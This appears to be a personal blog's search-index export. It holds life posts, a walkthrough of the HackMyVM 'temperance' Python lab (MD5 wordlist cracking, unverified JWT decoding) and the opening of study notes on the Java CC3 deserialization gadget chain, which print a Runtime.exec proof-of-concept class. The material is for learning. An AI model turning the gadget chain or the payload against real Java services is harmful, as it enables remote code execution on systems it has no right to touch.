<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>9.4回校小记</title>
    <url>/2024/09/04/9-4%E5%9B%9E%E6%A0%A1%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<p>随便说点，结束了hw，在北京多呆了四天，四处逛逛，今天回到学校，开始坐牢生活</p>
<p>回到宿舍，发现有的室友报名了教资   ，有的室友在开始准备雅思，真的有大三的实感了，大家在开始走往不同的方向</p>
<p>言归正传，新学期新气象，还要磨练技术，这段时间真的认识到好多同龄但是厉害很多的师傅，自己离他们还有一大截，这篇博客简单记录，公开出来（虽然不知道有多少人会看到）警醒自己不能再懒散了…</p>
]]></content>
      <tags>
        <tag>杂</tag>
        <tag>生活记录</tag>
      </tags>
  </entry>
  <entry>
    <title>2024总结</title>
    <url>/2025/01/02/2024%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h4 id="2024"><a href="#2024" class="headerlink" title="2024"></a>2024</h4><h5 id="比较有意思的事："><a href="#比较有意思的事：" class="headerlink" title="比较有意思的事："></a>比较有意思的事：</h5><p>一家人一起去了东北旅游，这是我小时候没有的经历。</p>
<p>第一次出国去了韩国，旅游途中刚好撞上了几个护网面试。</p>
<p>真的参加了一次护网，自己一个人去北京度过了一个多月，整个护网从准备到最后正式结束的过程中经历非常多不确定性，当时感觉非常难熬，现在回看也算是熬过来了，整个过程我感觉到的是内心的成长。</p>
<p>认识了很多非常好的网友，特别是花哥，威哥，给了我很多的帮助，24年最感恩的事。</p>
<p>和朋友线下的见面总是有趣的。</p>
<h5 id="学习上："><a href="#学习上：" class="headerlink" title="学习上："></a>学习上：</h5><p>总的来说进步多少是有的，但是自己不是太满意，可以进步更多，太多时候被自己的惰性打败，没有利用好每一次学习时间。</p>
<p>知识面变广了，除了网安也有在努力拓展别的知识，比如短暂地接触一下后端，也算是知道他难在哪里，干开发给我的感觉更像是一个设计师，写增删改查反而是最简单的。在网安方面，打了很多靶机，年末开始接触一些java审计的知识，都还是太浅，漏洞挖掘也不太行，要说未来值得努力的方向，那可太多了。</p>
<p>然后好像没有别的好说的了，过去一年真的长进不多，有些惭愧，没有像别的厉害的师傅一样拿到什么大的奖或者什么证书。</p>
<h5 id="心态上："><a href="#心态上：" class="headerlink" title="心态上："></a>心态上：</h5><p>自己多活一年长大一岁真的是有成长的，我在努力让自己保持情绪稳定，也要耐心对待身边的亲人朋友。今年更多的时间是在跟自己相处，至少比去年比有多认识自己一些。</p>
<h5 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h5><p>有新鲜的经历，也有很多挫败的时候。从前都没有对自己的一年好好总结，今年我要记录下来，以后回看都是自己成长的脚印。反思的过程中真的又一次意识到自己的不足，写下这篇还有部分原因是督促自己，2025年要比24年成长得更多！</p>
<h4 id="2025目标"><a href="#2025目标" class="headerlink" title="2025目标"></a>2025目标</h4><ul>
<li>更新30篇文章，多记录学习过程，勤做笔记，不断拓宽自己的知识面，也许是向java审计或者插件开发方向走。</li>
<li>成功找到实习。</li>
<li>完整看完7本书，练练自己的文笔。</li>
<li>多认识新朋友，勇敢尝试新鲜东西。</li>
<li>希望找到新的视角看人生，回头会看25年的时候会发现自己又进步了，而且还是进步了一大截。</li>
</ul>
<p>最后分享一些有趣的照片：）</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/IMG_0248.JPG"   style="zoom:50%;" >

<p>南方人第一次看到雪，在哈尔滨</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/8611e80513402416617f3d2ea6c51154.JPG"   style="zoom:50%;" >

<p>在飞机上用胶片相机拍下的云景</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250102233241.png"   style="zoom: 25%;" >

<p>韩国街景</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250102233219.png"   style="zoom:50%;" >

<p>梨花女子大学附近的路</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250102233311.png"   style="zoom: 25%;" >

<p>北京天安门打卡，后来一个人逛了好多景点</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250102233406.png"   style="zoom: 25%;" >

<p>生日那天晚上下班买了个好利来回出租屋给自己的仪式感</p>
]]></content>
      <tags>
        <tag>杂</tag>
        <tag>生活记录</tag>
      </tags>
  </entry>
  <entry>
    <title>7.28深夜小记</title>
    <url>/2024/07/28/7-28%E6%B7%B1%E5%A4%9C%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<p>好久没更新博客了，一方面是因为在家的时候放假太安逸有点懒了，一方面是因为现在来北京了，最近在做项目（牛马），这么晚还不睡是因为在调作息，希望明天晚上夜班不要瞌睡。</p>
<p>然后一个人手机也刷累了就不知道要干啥，学习也学不太下，最近生活被工作挤占了，有点停止了思考（虽然有空思考的时候也没思考出什么，依旧对未来充满迷茫😕</p>
<p>打开电脑看看这看看那，就想着写篇博客记录下这一晚上吧</p>
<p>附：今晚一个人爽吃麦当劳薯条（吐槽一下本挑食人目前在北京没吃到什么特别好吃的东西</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240730035355.png"   style="zoom:50%;" >

<p>吃完骑车兜风随手拍</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240730035326.png"   style="zoom:50%;" >

<p>写于7.28凌晨</p>
]]></content>
      <tags>
        <tag>杂</tag>
        <tag>生活记录</tag>
      </tags>
  </entry>
  <entry>
    <title>HMVlabs-temperance</title>
    <url>/2024/06/03/HMVlabs-temperance/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>前段时间就想着要好好把python练一练，刚好最近hmv新出了一个labs，其实不是很难，但我还是要gpt帮助，算是把一些语法巩固了一下，昨晚还是觉得要记一下，不然做完了不回顾其实没什么增长。</p>
<h4 id="levelx00"><a href="#levelx00" class="headerlink" title="levelx00"></a>levelx00</h4><p>一开始还花了点时间理解这个lab要怎么打，第一关就是带入门，先看看整体代码逻辑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;temperance.hackmyvm.eu&quot;</span></span><br><span class="line">PORT = <span class="number">9988</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s: <span class="comment"># 建立socker连接</span></span><br><span class="line">    s.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Receiving Intro&#x27;</span>)	<span class="comment"># 接收信息</span></span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">    s.send(<span class="string">b&#x27;levelx00&#x27;</span>) <span class="comment"># 发生选择的关卡，后续都是通过这个控制关卡</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Receiving challenge.&#x27;</span>)</span><br><span class="line">    data2 = s.recv(<span class="number">1024</span>) <span class="comment"># 接收数据，后续做一些处理</span></span><br><span class="line">    <span class="built_in">print</span>(data2)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">    s.send(data2)	<span class="comment"># 处理后再发过去</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Recibo flag&#x27;</span>)</span><br><span class="line">    data3 = s.recv(<span class="number">1024</span>) <span class="comment"># 如果是对方期望的数据，会返回flag，用recv接收</span></span><br><span class="line">    <span class="built_in">print</span>(data3)</span><br></pre></td></tr></table></figure>

<p>就是这样执行这个代码，就能获得第一关的flag，后续每一关都有新的要求，接收数据，对数据进行处理然后发回去</p>
<p>前几关都太简单了，我直接记录一些我觉得比较可说的</p>
<h4 id="levelx06"><a href="#levelx06" class="headerlink" title="levelx06"></a>levelx06</h4><p>“In this mission you will receive a string and you must return its length. (as string, not as int).”</p>
<p>接收一个字符串，注意这个关卡接受的数据都是byte型，进行一些字符处理还要转换成str</p>
<p>经历了这个，我更清晰了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符-&gt;bytes:data.encode()</span><br><span class="line">bytes-&gt;字符:string.decode()</span><br></pre></td></tr></table></figure>

<p>所以06发送回去的数据应该是，要转成bytes型</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s.send((<span class="built_in">str</span>(<span class="built_in">len</span>(data2))).encode())</span><br></pre></td></tr></table></figure>

<h4 id="levelx08"><a href="#levelx08" class="headerlink" title="levelx08"></a>levelx08</h4><p>“In this mission you will receive 2 numbers, you must return the result of adding both.”</p>
<p>接收一个两个数字，返回相加的结果，借助split分割出来，列表里面是bytes型，然后强制转换成int型，s.send不能发int型要先转成str再转成bytes型，不能to_bytes()，我发现会自动变成ascii</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data2 = s.recv(<span class="number">1024</span>)</span><br><span class="line">  <span class="built_in">print</span>(data2)</span><br><span class="line"></span><br><span class="line">  numbers=data2.split()</span><br><span class="line">  <span class="built_in">print</span>(numbers)</span><br><span class="line">  result=(<span class="built_in">int</span>(numbers[<span class="number">0</span>]) + <span class="built_in">int</span>(numbers[<span class="number">1</span>]))</span><br><span class="line">  <span class="comment"># Send the challenge solved / Envia el resultado del challenge.</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">  s.send(<span class="built_in">str</span>(result).encode())</span><br></pre></td></tr></table></figure>

<h4 id="levelx09"><a href="#levelx09" class="headerlink" title="levelx09"></a>levelx09</h4><p>rot13解密，直接找函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rot13</span>(<span class="params">i</span>):</span><br><span class="line">    cipher = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> i.isupper():</span><br><span class="line">        <span class="keyword">if</span> <span class="number">90</span> &gt;= <span class="built_in">ord</span>(i) + <span class="number">13</span>:</span><br><span class="line">            cipher += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) + <span class="number">13</span> - <span class="number">65</span>) % <span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="number">13</span> - <span class="number">65</span>) % <span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line">    <span class="keyword">elif</span> i.islower():</span><br><span class="line">        <span class="keyword">if</span> <span class="number">122</span> &gt;= <span class="built_in">ord</span>(i) + <span class="number">13</span>:</span><br><span class="line">            cipher += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) + <span class="number">13</span> - <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="number">13</span> - <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cipher += i</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br></pre></td></tr></table></figure>

<h4 id="levelx10"><a href="#levelx10" class="headerlink" title="levelx10"></a>levelx10</h4><p>“In this mission you will receive numbers separated by spaces, you must return them in order from  smallest to largest and without separating them with spaces. “</p>
<p>接收：80 37 67 41 31 要返回：3137416780</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment"># 转str</span></span><br><span class="line">  nums = data2.split() <span class="comment"># 按空格分割</span></span><br><span class="line">  int_list = [<span class="built_in">int</span>(item) <span class="keyword">for</span> item <span class="keyword">in</span> nums] <span class="comment"># 列表每个元素都转成int</span></span><br><span class="line">  sorted_list = <span class="built_in">sorted</span>(nums) <span class="comment"># 排序</span></span><br><span class="line">  data3 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> sorted_list: <span class="comment"># 拼接起来</span></span><br><span class="line">      data3 += i</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">  s.send(data3.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h4 id="levelx13"><a href="#levelx13" class="headerlink" title="levelx13"></a>levelx13</h4><p>“In this mission you receive a list of strings, you must sort them alphabetically and return the last string in the list. The characters “[“ and “]” must be removed.”</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240603105035.png" ></p>
<p>就是给很多字符串排序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">data2 = data2[<span class="number">1</span>:-<span class="number">1</span>] <span class="comment"># 去除前后[]</span></span><br><span class="line">ss = data2.split() </span><br><span class="line">ss = <span class="built_in">sorted</span>(ss) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">s.send(ss[-<span class="number">1</span>].encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h4 id="levelx17"><a href="#levelx17" class="headerlink" title="levelx17"></a>levelx17</h4><p>“ In this mission you receive a 1 pixel png encoded in base64, you must decode it and return the last RGBA value.”</p>
<p>生成一张图片然后要找出里面最后一个RGBA数据，这个就要用到特定的库</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> imagesize  <span class="comment"># 需要用到这三个库</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image </span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"> 。。。。。。。</span><br><span class="line">		data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    decoded_data = base64.b64decode(data2)</span><br><span class="line">    image = Image.<span class="built_in">open</span>(BytesIO(decoded_data)) <span class="comment"># 将解码后的数据转换为图像</span></span><br><span class="line">    rgba_data = image.convert(<span class="string">&quot;RGBA&quot;</span>).getdata() <span class="comment"># 用库里的函数提取出RGBA数据</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Send the challenge solved / Envia el resultado del challenge.</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">    s.send(<span class="built_in">str</span>(rgba_data[-<span class="number">1</span>][-<span class="number">1</span>]).encode())</span><br></pre></td></tr></table></figure>

<h4 id="levelx19"><a href="#levelx19" class="headerlink" title="levelx19"></a>levelx19</h4><p>接收一段数据，base64解密，写入一个新建的zip，解压读取里面HMV.txt的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">。。。。。。</span><br><span class="line">    data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data2 = base64.b64decode(data2)</span><br><span class="line">    zip_filename = <span class="string">&quot;decoded_archive.zip&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(zip_filename, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> zip_file: <span class="comment"># 把解码后的内容新建一个zip写入</span></span><br><span class="line">        zip_file.write(data2)</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref: </span><br><span class="line">        txt_filename = <span class="string">&quot;HMV.txt&quot;</span></span><br><span class="line">        <span class="keyword">with</span> zip_ref.<span class="built_in">open</span>(txt_filename) <span class="keyword">as</span> txt_file: <span class="comment"># 读取txt内容</span></span><br><span class="line">            txt_content = txt_file.read()</span><br><span class="line">            <span class="built_in">print</span>(txt_content)</span><br></pre></td></tr></table></figure>

<h4 id="levelx20"><a href="#levelx20" class="headerlink" title="levelx20"></a>levelx20</h4><p>rockyou前五十个词作为字典，接收一个md5，去爆破找出原文是字典中的哪一个</p>
<p>命令行读取txt文件前五十行数据，<em>head -n 50 rockuou.txt</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">common_passwords = [</span><br><span class="line">    <span class="string">&quot;123456&quot;</span>,<span class="string">&quot;12345&quot;</span>,<span class="string">&quot;123456789&quot;</span>,<span class="string">&quot;password&quot;</span>,<span class="string">&quot;iloveyou&quot;</span>,<span class="string">&quot;princess&quot;</span>,<span class="string">&quot;1234567&quot;</span>,<span class="string">&quot;rockyou&quot;</span>,</span><br><span class="line">    <span class="string">&quot;12345678&quot;</span>,<span class="string">&quot;abc123&quot;</span>,<span class="string">&quot;nicole&quot;</span>,<span class="string">&quot;daniel&quot;</span>,<span class="string">&quot;babygirl&quot;</span>,<span class="string">&quot;monkey&quot;</span>,<span class="string">&quot;lovely&quot;</span>,<span class="string">&quot;jessica&quot;</span>,<span class="string">&quot;654321&quot;</span>,<span class="string">&quot;michael&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ashley&quot;</span>,<span class="string">&quot;qwerty&quot;</span>,<span class="string">&quot;111111&quot;</span>,<span class="string">&quot;iloveu&quot;</span>,<span class="string">&quot;000000&quot;</span>,<span class="string">&quot;michelle&quot;</span>,<span class="string">&quot;tigger&quot;</span>,<span class="string">&quot;sunshine&quot;</span>,<span class="string">&quot;chocolate&quot;</span>,<span class="string">&quot;password1&quot;</span>,</span><br><span class="line">   <span class="string">&quot;soccer&quot;</span>,<span class="string">&quot;anthony&quot;</span>,<span class="string">&quot;friends&quot;</span>,<span class="string">&quot;butterfly&quot;</span>,<span class="string">&quot;purple&quot;</span>,<span class="string">&quot;angel&quot;</span>,<span class="string">&quot;jordan&quot;</span>,<span class="string">&quot;liverpool&quot;</span>,<span class="string">&quot;justin&quot;</span>,<span class="string">&quot;loveme&quot;</span>,<span class="string">&quot;fuckyou&quot;</span>,</span><br><span class="line">    <span class="string">&quot;123123&quot;</span>,<span class="string">&quot;football&quot;</span>,<span class="string">&quot;secret&quot;</span>,<span class="string">&quot;andrea&quot;</span>,<span class="string">&quot;carlos&quot;</span>,<span class="string">&quot;jennifer&quot;</span>,<span class="string">&quot;joshua&quot;</span>,<span class="string">&quot;bubbles&quot;</span>,<span class="string">&quot;1234567890&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;hannah&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash1</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(text.encode()).hexdigest() <span class="comment"># 生成md5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_md5</span>(<span class="params">md5_hash</span>):</span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> common_passwords:</span><br><span class="line">        <span class="keyword">if</span> md5_hash == md5_hash1(password): <span class="comment"># 一个一个去对比，找到了就返回</span></span><br><span class="line">            <span class="keyword">return</span> password</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> 。。。。。。</span><br><span class="line"></span><br><span class="line">		data2 = crack_md5(data2)</span><br><span class="line">  	s.send(data2.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h4 id="levelx25"><a href="#levelx25" class="headerlink" title="levelx25"></a>levelx25</h4><p>接收到数据是个url，发送请求然后读取返回包的header</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">  response = requests.get(data2)</span><br><span class="line">  header = response.headers.get(<span class="string">&#x27;Hmv-Code&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="levelx26"><a href="#levelx26" class="headerlink" title="levelx26"></a>levelx26</h4><p>生成一张图片，要识别出里面的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">。。。。。。。</span><br><span class="line">    data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    decoded_data = base64.b64decode(data2)</span><br><span class="line">    image = Image.<span class="built_in">open</span>(BytesIO(decoded_data))</span><br><span class="line">    image.save(<span class="string">&quot;decoded_image.png&quot;</span>)</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&quot;decoded_image.png&quot;</span>)</span><br><span class="line">    text = pytesseract.image_to_string(img) <span class="comment"># 主要是用这个库，但是有时候不是很准确</span></span><br></pre></td></tr></table></figure>

<h4 id="levelx27"><a href="#levelx27" class="headerlink" title="levelx27"></a>levelx27</h4><p>接收到数据是个url，发送请求然后返回的是&#x2F;etc&#x2F;passwd的内容，要提取里面用户proxy的uid</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">response = requests.get(data2)</span><br><span class="line">html_content = response.text</span><br><span class="line">ll = html_content.split(<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 按换行分割</span></span><br><span class="line">pp = ll[-<span class="number">3</span>].split(<span class="string">&#x27;:&#x27;</span>) <span class="comment"># 再按：分割</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">s.send(<span class="built_in">str</span>(pp[<span class="number">2</span>]).encode()) 发送第三个字段也就是UID</span><br></pre></td></tr></table></figure>

<h4 id="levelx28"><a href="#levelx28" class="headerlink" title="levelx28"></a>levelx28</h4><p>jwt解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extract_hmv_key</span>(<span class="params">token</span>):</span><br><span class="line">    decoded_token = jwt.decode(token, options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    hmv_key = decoded_token.get(<span class="string">&#x27;HMVKey&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> hmv_key</span><br></pre></td></tr></table></figure>

<h4 id="levelx29"><a href="#levelx29" class="headerlink" title="levelx29"></a>levelx29</h4><p>发送两个坐标计算他们之间的距离，这个要用到特定的库（在此用umz的代码）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240603112230.png" ></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> geopy.distance <span class="keyword">import</span> geodesic</span><br><span class="line">。。。。。。</span><br><span class="line">		pattern = <span class="string">r&quot;Lat: (\d+) Lon: (\d+) - Lat: (\d+) Lon: (\d+)&quot;</span></span><br><span class="line">    matches = re.<span class="keyword">match</span>(pattern, data2)</span><br><span class="line">    <span class="keyword">if</span> matches:</span><br><span class="line">        coord1 = (<span class="built_in">int</span>(matches.group(<span class="number">1</span>)), <span class="built_in">int</span>(matches.group(<span class="number">2</span>)))</span><br><span class="line">        coord2 = (<span class="built_in">int</span>(matches.group(<span class="number">3</span>)), <span class="built_in">int</span>(matches.group(<span class="number">4</span>)))</span><br><span class="line">    distance = geodesic(coord1, coord2).kilometers</span><br><span class="line">    formatted_distance = <span class="string">&quot;&#123;:.3f&#125;&quot;</span>.<span class="built_in">format</span>(distance)</span><br><span class="line">    s.send(formatted_distance.encode())</span><br></pre></td></tr></table></figure>

<h4 id="levelx31"><a href="#levelx31" class="headerlink" title="levelx31"></a>levelx31</h4><p>要识别二维码，也是用到特定的库</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan_qr_code</span>(<span class="params">image_path</span>):</span><br><span class="line">    <span class="comment"># 打开图片</span></span><br><span class="line">    image = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    <span class="comment"># 解码图片中的二维码</span></span><br><span class="line">    decoded_objects = decode(image)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 输出解码结果</span></span><br><span class="line">    <span class="keyword">for</span> obj <span class="keyword">in</span> decoded_objects:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Type:&#x27;</span>, obj.<span class="built_in">type</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Data:&#x27;</span>, obj.data)</span><br><span class="line">        <span class="keyword">return</span> obj.data</span><br><span class="line">。。。。。。。。</span><br><span class="line">		data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    decoded_data = base64.b64decode(data2)</span><br><span class="line">    image = Image.<span class="built_in">open</span>(BytesIO(decoded_data))</span><br><span class="line">    image.save(<span class="string">&quot;qr.png&quot;</span>)</span><br><span class="line">    image = Image.<span class="built_in">open</span>(<span class="string">&quot;qr.png&quot;</span>)</span><br><span class="line">    img_path = <span class="string">&#x27;qr.png&#x27;</span></span><br><span class="line">    image.save(img_path)</span><br><span class="line"></span><br><span class="line">    data2 = scan_qr_code(img_path) <span class="comment"># 扫码</span></span><br></pre></td></tr></table></figure>

<h4 id="levelx32"><a href="#levelx32" class="headerlink" title="levelx32"></a>levelx32</h4><p>“In this mission you receive an md5 and a string. You must permute the string until it matches md5 and return the string.”</p>
<p>有一个md5，和一个字符串，重新排序字符串，找出那个md5的原文</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">。。。。。。。</span><br><span class="line">		data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    md = data2.split()[<span class="number">0</span>]</span><br><span class="line">    key = data2.split()[<span class="number">1</span>]</span><br><span class="line">    permutations = itertools.permutations(key)</span><br><span class="line">    <span class="keyword">for</span> perm <span class="keyword">in</span> permutations:</span><br><span class="line">        perm_str = <span class="string">&#x27;&#x27;</span>.join(perm)</span><br><span class="line">        perm_md5 = hashlib.md5(perm_str.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> perm_md5 == md:</span><br><span class="line">            data2 = perm_str</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h4 id="写完了"><a href="#写完了" class="headerlink" title="写完了"></a>写完了</h4><p>ai太牛了，一点一点调，加深对知识的印象，但是写完这个感觉自己蠢蠢的。。。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>cc3学习笔记</title>
    <url>/2025/02/18/cc3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>相比CC1和CC6利用Runtime.exec()，，但是很多服务器会给Runtime设置黑名单，所以CC3使用的是类加载机制，通过加载一个恶意的类来实现恶意代码执行</p>
<h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><ul>
<li>jdk8u65</li>
<li>Commons-Collections 3.2.1</li>
</ul>
<h4 id="TemplatesImpl的利用"><a href="#TemplatesImpl的利用" class="headerlink" title="TemplatesImpl的利用"></a>TemplatesImpl的利用</h4><p>前面学类加载的时候就了解到，大多数情况下defineClass的作用域是不开放的，但是找到一个类TemplatesImpl里的作用域是default，利用路线是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#newTransformer()</span><br><span class="line">	-&gt; TemplatesImpl#getTransletInstance()</span><br><span class="line">		-&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">			-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>

<p>现在按照之前的方法，写一个Calc类，通过<code>TemplatesImpl</code>实现类加载，看看效果，现在的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结合上一篇文章的代码</p>
